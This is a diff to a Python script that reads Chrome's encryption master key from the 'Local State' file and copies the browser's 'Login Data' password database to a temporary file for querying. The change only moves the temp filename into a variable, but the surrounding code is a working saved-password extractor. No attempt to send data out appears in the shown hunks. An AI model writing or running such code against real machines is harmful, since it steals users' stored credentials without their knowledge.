@@ -7,6 +7,10 @@ from Crypto.Cipher import AES
 import shutil
 
 
+temp_db = "Loginvault.db"
+
+
+
 def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
         local_state = f.read()
@@ -44,8 +48,8 @@ if __name__ == '__main__':
 
     master_key = get_master_key()
     login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-    conn = sqlite3.connect("Loginvault.db")
+    shutil.copy2(login_db, temp_db) #making a temp copy since Login Data DB is locked while Chrome is running
+    conn = sqlite3.connect(temp_db)
     cursor = conn.cursor()
 
     try:
@@ -62,6 +66,6 @@ if __name__ == '__main__':
     cursor.close()
     conn.close()
     try:
-        os.remove("Loginvault.db")
+        os.remove(temp_db)
     except Exception as e:
         pass
